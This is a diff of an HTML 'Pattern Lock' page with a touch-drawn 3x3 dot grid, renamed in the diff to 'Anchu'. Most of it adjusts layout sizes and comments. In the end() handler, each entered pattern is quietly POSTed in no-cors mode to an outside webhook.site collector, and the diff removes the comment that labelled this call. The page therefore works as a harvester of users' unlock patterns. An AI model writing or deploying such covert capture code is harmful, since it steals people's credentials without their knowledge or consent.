@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Pattern Lock</title>
+<title>Anchu</title>
 
 <style>
 body {
@@ -15,9 +15,6 @@ body {
   touch-action: none;
 }
 
-.wrapper {
-  position: relative;
-}
 
 canvas {
   position: absolute;
@@ -25,22 +22,32 @@ canvas {
   left: 0;
 }
 
+.wrapper {
+  position: relative;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
 .grid {
   display: grid;
-  grid-template-columns: repeat(3, 80px);
-  gap: 80px;
+  grid-template-columns: repeat(3, 18vw);
+  gap: 10vw;
+  justify-content: center;
+  align-items: center;
 }
 
 .dot {
-  width: 22px;
-  height: 22px;
-  background: #aaa;
+  width: 5vw;
+  height: 5vw;
+  background: #888;
   border-radius: 50%;
+  margin: auto;
 }
 
 .dot.active {
   background: #4CAF50;
-  transform: scale(1.6);
+  transform: scale(1.8);
 }
 </style>
 </head>
@@ -62,7 +69,6 @@ canvas {
     <div class="dot" data-id="9"></div>
   </div>
 </div>
-
 <script>
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
@@ -73,7 +79,7 @@ let pattern = [];
 let drawing = false;
 let current = null;
 
-// ✅ Resize canvas correctly
+// ✅ Perfect canvas alignment
 function resize() {
   const rect = grid.getBoundingClientRect();
   const dpr = window.devicePixelRatio || 1;
@@ -102,16 +108,17 @@ function center(dot) {
 
 // ✅ Pointer position
 function point(e) {
-  const g = grid.getBoundingClientRect();
+  const rect = grid.getBoundingClientRect();
+
   return {
-    x: e.clientX - g.left,
-    y: e.clientY - g.top,
+    x: e.clientX - rect.left,
+    y: e.clientY - rect.top,
     cx: e.clientX,
     cy: e.clientY
   };
 }
 
-// ✅ Draw loop (smooth)
+// ✅ Smooth drawing loop
 function draw() {
   ctx.clearRect(0, 0, canvas.width, canvas.height);
 
@@ -139,7 +146,7 @@ function draw() {
 }
 draw();
 
-// ✅ Activate dot
+// ✅ Activate
 function activate(dot) {
   const id = dot.dataset.id;
 
@@ -180,14 +187,12 @@ function end() {
   const result = pattern.join("-");
   alert("Pattern: " + result);
 
-  // ✅ webhook
   fetch("https://webhook.site/f6af3aa6-bc95-46b5-a5a3-03d16ed5cb7b", {
     method: "POST",
     mode: "no-cors",
     body: "pattern=" + result
   });
 
-  // reset
   setTimeout(() => {
     pattern = [];
     current = null;
@@ -195,7 +200,7 @@ function end() {
   }, 600);
 }
 
-// ✅ Events
+// ✅ Pointer events (best for mobile)
 document.addEventListener("pointerdown", start);
 document.addEventListener("pointermove", move);
 document.addEventListener("pointerup", end);
